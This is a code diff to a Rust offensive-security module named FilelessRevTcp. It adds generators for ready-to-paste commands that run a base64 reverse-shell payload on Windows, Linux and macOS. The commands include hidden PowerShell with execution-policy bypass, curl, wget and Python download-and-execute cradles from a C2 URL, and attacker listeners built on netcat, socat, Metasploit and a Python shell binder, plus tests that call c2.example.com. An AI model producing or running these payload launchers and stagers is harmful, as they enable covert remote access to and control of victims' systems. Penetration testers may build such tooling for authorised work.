@@ -27,6 +27,7 @@
 use anyhow::{bail, Result};
 use async_trait::async_trait;
 use base64::Engine;
+use serde::{Deserialize, Serialize};
 use std::collections::HashMap;
 
 use crate::core::module::{
@@ -123,6 +124,247 @@ impl FilelessRevTcp {
         self.engine = Some(engine);
         Ok(())
     }
+
+    /// Generate ready-to-paste execution commands for each target OS
+    ///
+    /// Returns a vector of execution commands that can be used to run the payload
+    /// on the target system. Commands are OS-specific and include multiple options.
+    pub fn generate_execution_commands(
+        &self,
+        payload_base64: &str,
+        target_os: &TargetOS,
+        c2_url: Option<&str>,
+    ) -> Vec<ExecutionCommand> {
+        let mut commands = Vec::new();
+
+        match target_os {
+            TargetOS::Windows => {
+                // PowerShell Direct Execution (most common)
+                commands.push(ExecutionCommand {
+                    name: "PowerShell Base64 Decode & Execute".to_string(),
+                    description: "Decodes and executes the payload directly in PowerShell".to_string(),
+                    command: format!(
+                        "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{}')) | iex\"",
+                        payload_base64
+                    ),
+                    requires_admin: false,
+                });
+
+                // PowerShell encoded command
+                let encoded = base64::engine::general_purpose::STANDARD
+                    .encode(payload_base64.encode_utf16().flat_map(|c| c.to_le_bytes()).collect::<Vec<u8>>());
+                commands.push(ExecutionCommand {
+                    name: "PowerShell Encoded Command".to_string(),
+                    description: "Uses -EncodedCommand flag for execution".to_string(),
+                    command: format!("powershell -NoP -W Hidden -Enc {}", encoded),
+                    requires_admin: false,
+                });
+
+                // CMD via PowerShell
+                commands.push(ExecutionCommand {
+                    name: "CMD via PowerShell".to_string(),
+                    description: "Executes through cmd.exe calling PowerShell".to_string(),
+                    command: format!(
+                        "cmd /c powershell -NoP -W Hidden -Command \"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{}')) | iex\"",
+                        payload_base64
+                    ),
+                    requires_admin: false,
+                });
+
+                // C2 URL stager if provided
+                if let Some(url) = c2_url {
+                    commands.push(ExecutionCommand {
+                        name: "PowerShell Download Cradle".to_string(),
+                        description: "Downloads and executes Stage-2 from C2 URL".to_string(),
+                        command: format!(
+                            "powershell -NoP -W Hidden -Command \"IEX(New-Object Net.WebClient).DownloadString('{}')\"",
+                            url
+                        ),
+                        requires_admin: false,
+                    });
+                }
+            }
+            TargetOS::Linux => {
+                // Bash base64 decode
+                commands.push(ExecutionCommand {
+                    name: "Bash Base64 Decode & Execute".to_string(),
+                    description: "Decodes and executes via bash".to_string(),
+                    command: format!("echo '{}' | base64 -d | bash", payload_base64),
+                    requires_admin: false,
+                });
+
+                // Python execution
+                commands.push(ExecutionCommand {
+                    name: "Python Base64 Execute".to_string(),
+                    description: "Uses Python to decode and execute".to_string(),
+                    command: format!(
+                        "python3 -c \"import base64;exec(base64.b64decode('{}'))\"",
+                        payload_base64
+                    ),
+                    requires_admin: false,
+                });
+
+                // C2 URL stager if provided
+                if let Some(url) = c2_url {
+                    commands.push(ExecutionCommand {
+                        name: "Curl Download & Execute".to_string(),
+                        description: "Downloads and executes from C2 URL".to_string(),
+                        command: format!("curl -s {} | bash", url),
+                        requires_admin: false,
+                    });
+
+                    commands.push(ExecutionCommand {
+                        name: "Wget Download & Execute".to_string(),
+                        description: "Alternative using wget".to_string(),
+                        command: format!("wget -qO- {} | bash", url),
+                        requires_admin: false,
+                    });
+                }
+            }
+            TargetOS::MacOS => {
+                // macOS uses -D for base64 decode
+                commands.push(ExecutionCommand {
+                    name: "Bash Base64 Decode & Execute (macOS)".to_string(),
+                    description: "Decodes and executes via bash (macOS base64 -D flag)".to_string(),
+                    command: format!("echo '{}' | base64 -D | bash", payload_base64),
+                    requires_admin: false,
+                });
+
+                // Python execution (available on macOS)
+                commands.push(ExecutionCommand {
+                    name: "Python Base64 Execute".to_string(),
+                    description: "Uses Python to decode and execute".to_string(),
+                    command: format!(
+                        "python3 -c \"import base64;exec(base64.b64decode('{}'))\"",
+                        payload_base64
+                    ),
+                    requires_admin: false,
+                });
+
+                // osascript for AppleScript execution
+                commands.push(ExecutionCommand {
+                    name: "osascript Shell Execution".to_string(),
+                    description: "Executes via AppleScript shell command".to_string(),
+                    command: format!(
+                        "osascript -e 'do shell script \"echo {} | base64 -D | bash\"'",
+                        payload_base64
+                    ),
+                    requires_admin: false,
+                });
+
+                // C2 URL stager if provided
+                if let Some(url) = c2_url {
+                    commands.push(ExecutionCommand {
+                        name: "Curl Download & Execute".to_string(),
+                        description: "Downloads and executes from C2 URL".to_string(),
+                        command: format!("curl -s {} | bash", url),
+                        requires_admin: false,
+                    });
+                }
+            }
+            TargetOS::Any => {
+                // Cross-platform Python
+                commands.push(ExecutionCommand {
+                    name: "Python Universal".to_string(),
+                    description: "Cross-platform Python execution".to_string(),
+                    command: format!(
+                        "python3 -c \"import base64;exec(base64.b64decode('{}'))\"",
+                        payload_base64
+                    ),
+                    requires_admin: false,
+                });
+
+                // Python with fallback to python2
+                commands.push(ExecutionCommand {
+                    name: "Python with Fallback".to_string(),
+                    description: "Tries python3, falls back to python".to_string(),
+                    command: format!(
+                        "python3 -c \"import base64;exec(base64.b64decode('{}'))\" 2>/dev/null || python -c \"import base64;exec(base64.b64decode('{}'))\"",
+                        payload_base64, payload_base64
+                    ),
+                    requires_admin: false,
+                });
+
+                // C2 URL stager if provided
+                if let Some(url) = c2_url {
+                    commands.push(ExecutionCommand {
+                        name: "Python URL Fetch & Execute".to_string(),
+                        description: "Downloads and executes via Python urllib".to_string(),
+                        command: format!(
+                            "python3 -c \"import urllib.request;exec(urllib.request.urlopen('{}').read())\"",
+                            url
+                        ),
+                        requires_admin: false,
+                    });
+                }
+            }
+        }
+
+        commands
+    }
+
+    /// Generate listener command suggestions for receiving the reverse connection
+    ///
+    /// Returns commands for starting a listener on the attacker's machine
+    pub fn generate_listener_commands(&self, lhost: &str, lport: u16) -> Vec<ExecutionCommand> {
+        vec![
+            ExecutionCommand {
+                name: "Netcat Listener".to_string(),
+                description: "Simple netcat listener for reverse shell".to_string(),
+                command: format!("nc -lvnp {}", lport),
+                requires_admin: lport < 1024,
+            },
+            ExecutionCommand {
+                name: "Netcat Listener (GNU)".to_string(),
+                description: "GNU netcat with -e support".to_string(),
+                command: format!("nc -nlvp {}", lport),
+                requires_admin: lport < 1024,
+            },
+            ExecutionCommand {
+                name: "Ncat Listener (Nmap)".to_string(),
+                description: "Ncat from Nmap suite with SSL support".to_string(),
+                command: format!("ncat -lvnp {}", lport),
+                requires_admin: lport < 1024,
+            },
+            ExecutionCommand {
+                name: "Socat Listener".to_string(),
+                description: "Socat TCP listener".to_string(),
+                command: format!("socat TCP-LISTEN:{},reuseaddr,fork STDOUT", lport),
+                requires_admin: lport < 1024,
+            },
+            ExecutionCommand {
+                name: "Metasploit Handler".to_string(),
+                description: "Metasploit multi/handler for reverse shell".to_string(),
+                command: format!(
+                    "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST {}; set LPORT {}; exploit'",
+                    lhost, lport
+                ),
+                requires_admin: false,
+            },
+            ExecutionCommand {
+                name: "Python Listener".to_string(),
+                description: "Simple Python socket listener".to_string(),
+                command: format!(
+                    "python3 -c \"import socket;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(('0.0.0.0',{}));s.listen(1);c,a=s.accept();print(f'Connection from {{a}}');import subprocess;subprocess.call(['/bin/sh','-i'],stdin=c,stdout=c,stderr=c)\"",
+                    lport
+                ),
+                requires_admin: lport < 1024,
+            },
+        ]
+    }
+}
+
+/// Execution command structure for ready-to-paste commands
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct ExecutionCommand {
+    /// Name/identifier for the command
+    pub name: String,
+    /// Description of what the command does
+    pub description: String,
+    /// The actual command to execute
+    pub command: String,
+    /// Whether the command requires admin/root privileges
+    pub requires_admin: bool,
 }
 
 impl Default for FilelessRevTcp {
@@ -372,11 +614,25 @@ impl Module for FilelessRevTcp {
                 serde_json::json!(self.is_safe_mode()),
             );
 
+            // Generate execution commands for staged payload
+            let target_os = self.parse_target_os()?;
+            let stage1_exec_commands = self.generate_execution_commands(&stager.base64, &target_os, Some(&c2_url));
+            let listener_commands = self.generate_listener_commands(&lhost, lport);
+
+            data.insert(
+                "stage1_execution_commands".to_string(),
+                serde_json::json!(stage1_exec_commands),
+            );
+            data.insert(
+                "listener_commands".to_string(),
+                serde_json::json!(listener_commands),
+            );
+
             ModuleResult {
                 success: true,
                 message: format!(
-                    "Staged payload generated: Stage-1 ({} bytes) + Stage-2 ({} bytes)",
-                    stager.metadata.size, stage2.metadata.size
+                    "Staged payload generated: Stage-1 ({} bytes) + Stage-2 ({} bytes), {} execution commands available",
+                    stager.metadata.size, stage2.metadata.size, stage1_exec_commands.len()
                 ),
                 data,
                 timestamp: chrono::Utc::now(),
@@ -385,6 +641,12 @@ impl Module for FilelessRevTcp {
         } else {
             // Generate single-stage payload
             let payload = engine.generate_reverse_tcp(&lhost, lport)?;
+
+            // Generate execution commands for target OS
+            let target_os = self.parse_target_os()?;
+            let c2_url = self.options.get("C2_URL").filter(|s| !s.is_empty()).map(|s| s.as_str());
+            let execution_commands = self.generate_execution_commands(&payload.base64, &target_os, c2_url);
+            let listener_commands = self.generate_listener_commands(&lhost, lport);
 
             let mut data = HashMap::new();
             data.insert(
@@ -429,16 +691,27 @@ impl Module for FilelessRevTcp {
                 serde_json::json!(lport),
             );
 
+            // Add execution commands to result
+            data.insert(
+                "execution_commands".to_string(),
+                serde_json::json!(execution_commands),
+            );
+            data.insert(
+                "listener_commands".to_string(),
+                serde_json::json!(listener_commands),
+            );
+
             ModuleResult {
                 success: true,
                 message: format!(
-                    "Fileless reverse TCP payload generated: {} bytes, encrypted={}, target={}:{}, os={}, safe_mode={}",
+                    "Fileless reverse TCP payload generated: {} bytes, encrypted={}, target={}:{}, os={}, safe_mode={}, {} execution commands available",
                     payload.metadata.size,
                     payload.metadata.encrypted,
                     lhost,
                     lport,
                     payload.metadata.target_os,
-                    self.is_safe_mode()
+                    self.is_safe_mode(),
+                    execution_commands.len()
                 ),
                 data,
                 timestamp: chrono::Utc::now(),
@@ -580,5 +853,139 @@ mod tests {
         // Production mode requires confirmation
         module.set_option("SAFE_MODE", "false").unwrap();
         assert!(module.requires_confirmation());
+    }
+
+    #[test]
+    fn test_execution_commands_windows() {
+        let module = FilelessRevTcp::new();
+        let payload_base64 = "dGVzdCBwYXlsb2Fk"; // "test payload" in base64
+
+        let commands = module.generate_execution_commands(
+            payload_base64,
+            &TargetOS::Windows,
+            None,
+        );
+
+        assert!(!commands.is_empty());
+        assert!(commands.iter().any(|c| c.name.contains("PowerShell")));
+        assert!(commands.iter().all(|c| !c.command.is_empty()));
+    }
+
+    #[test]
+    fn test_execution_commands_linux() {
+        let module = FilelessRevTcp::new();
+        let payload_base64 = "dGVzdCBwYXlsb2Fk";
+
+        let commands = module.generate_execution_commands(
+            payload_base64,
+            &TargetOS::Linux,
+            None,
+        );
+
+        assert!(!commands.is_empty());
+        assert!(commands.iter().any(|c| c.name.contains("Bash")));
+        assert!(commands.iter().any(|c| c.name.contains("Python")));
+    }
+
+    #[test]
+    fn test_execution_commands_macos() {
+        let module = FilelessRevTcp::new();
+        let payload_base64 = "dGVzdCBwYXlsb2Fk";
+
+        let commands = module.generate_execution_commands(
+            payload_base64,
+            &TargetOS::MacOS,
+            None,
+        );
+
+        assert!(!commands.is_empty());
+        // macOS uses -D flag for base64
+        assert!(commands.iter().any(|c| c.command.contains("base64 -D")));
+        assert!(commands.iter().any(|c| c.name.contains("osascript")));
+    }
+
+    #[test]
+    fn test_execution_commands_with_c2_url() {
+        let module = FilelessRevTcp::new();
+        let payload_base64 = "dGVzdCBwYXlsb2Fk";
+        let c2_url = "https://c2.example.com/stage2";
+
+        let commands = module.generate_execution_commands(
+            payload_base64,
+            &TargetOS::Linux,
+            Some(c2_url),
+        );
+
+        assert!(!commands.is_empty());
+        // Should include C2 download commands
+        assert!(commands.iter().any(|c| c.command.contains(c2_url)));
+        assert!(commands.iter().any(|c| c.name.contains("Curl") || c.name.contains("Download")));
+    }
+
+    #[test]
+    fn test_listener_commands() {
+        let module = FilelessRevTcp::new();
+        let commands = module.generate_listener_commands("192.168.1.100", 4444);
+
+        assert!(!commands.is_empty());
+        assert!(commands.iter().any(|c| c.name.contains("Netcat")));
+        assert!(commands.iter().any(|c| c.name.contains("Metasploit")));
+        assert!(commands.iter().any(|c| c.name.contains("Socat")));
+
+        // Check port is included in commands
+        assert!(commands.iter().all(|c| c.command.contains("4444")));
+    }
+
+    #[test]
+    fn test_listener_commands_privileged_port() {
+        let module = FilelessRevTcp::new();
+        let commands = module.generate_listener_commands("192.168.1.100", 443);
+
+        // Privileged ports (< 1024) should require admin
+        let nc_command = commands.iter().find(|c| c.name == "Netcat Listener").unwrap();
+        assert!(nc_command.requires_admin);
+    }
+
+    #[test]
+    fn test_listener_commands_unprivileged_port() {
+        let module = FilelessRevTcp::new();
+        let commands = module.generate_listener_commands("192.168.1.100", 4444);
+
+        // Unprivileged ports should not require admin
+        let nc_command = commands.iter().find(|c| c.name == "Netcat Listener").unwrap();
+        assert!(!nc_command.requires_admin);
+    }
+
+    #[tokio::test]
+    async fn test_run_includes_execution_commands() {
+        let mut module = FilelessRevTcp::new();
+        module.set_option("LHOST", "192.168.1.100").unwrap();
+        module.set_option("LPORT", "4444").unwrap();
+        module.set_option("TARGET_OS", "linux").unwrap();
+
+        let result = module.run().await.unwrap();
+
+        assert!(result.success);
+        assert!(result.data.contains_key("execution_commands"));
+        assert!(result.data.contains_key("listener_commands"));
+
+        // Verify execution_commands is an array
+        let exec_cmds = result.data.get("execution_commands").unwrap();
+        assert!(exec_cmds.is_array());
+        assert!(!exec_cmds.as_array().unwrap().is_empty());
+    }
+
+    #[tokio::test]
+    async fn test_staged_run_includes_execution_commands() {
+        let mut module = FilelessRevTcp::new();
+        module.set_option("LHOST", "192.168.1.100").unwrap();
+        module.set_option("STAGED", "true").unwrap();
+        module.set_option("C2_URL", "https://c2.example.com/stage2").unwrap();
+
+        let result = module.run().await.unwrap();
+
+        assert!(result.success);
+        assert!(result.data.contains_key("stage1_execution_commands"));
+        assert!(result.data.contains_key("listener_commands"));
     }
 }
